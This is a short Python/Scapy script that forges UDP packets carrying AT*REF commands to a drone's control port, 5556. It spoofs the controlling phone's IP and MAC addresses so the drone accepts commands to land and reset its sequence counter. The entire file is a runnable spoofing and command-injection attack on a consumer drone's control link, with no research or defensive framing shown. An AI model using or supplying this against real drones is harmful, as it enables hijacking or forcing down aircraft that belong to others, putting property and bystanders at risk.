from scapy.all import *
from time import sleep

srcIP = '192.168.1.2' # my phone's IP
dstIP = '192.168.1.1' # drone's IP
srcPort = 5556 # source port
dstPort = 5556 # destination port
srcMAC = '24:00:ba:bd:cc:17' # my phone's MAC
dstMAC = '90:03:b7:fd:22:49' # drone's MAC

takeoff = "AT*REF=900000,290718208\r" # 
landing = "AT*REF=10000000,290717696\r" # Landing


reset = "AT*REF=1,290717696\r" # Reset by sending 1 as sequence Number


landing_packet = Ether(src=srcMAC, dst=dstMAC) / IP(src=srcIP, dst=dstIP) / UDP(sport=srcPort, dport=dstPort) / landing
print landing
sendp(landing_packet, iface="wlp3s0")


reset_packet = Ether(src=srcMAC, dst=dstMAC) / IP(src=srcIP, dst=dstIP) / UDP(sport=srcPort, dport=dstPort) / reset
print reset
sendp(reset_packet, iface="wlp3s0")

